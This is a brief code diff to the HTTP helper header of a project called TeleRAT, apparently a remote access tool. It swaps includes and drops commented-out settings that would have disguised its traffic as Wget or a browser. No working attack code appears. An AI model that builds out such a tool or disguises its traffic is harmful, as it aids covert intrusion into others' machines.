@@ -1,15 +1,11 @@
 #ifndef HTTP_HELPER_
 #define HTTP_HELPER_
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
+#include "common.h"
 
 #define USER_AGENT "TeleRAT/0.1.0"
-// #define USER_AGENT "Wget/1.17.1 (linux-gnu)"
 #define SERVER "TeleRAT"
 #define BOUNDARY "----TeleRATBoundary"
-// #define BOUNDARY "----WebKitFormBoundary7MA4YWxkTrZu0gW"
 
 struct http_request{
     char method[10];
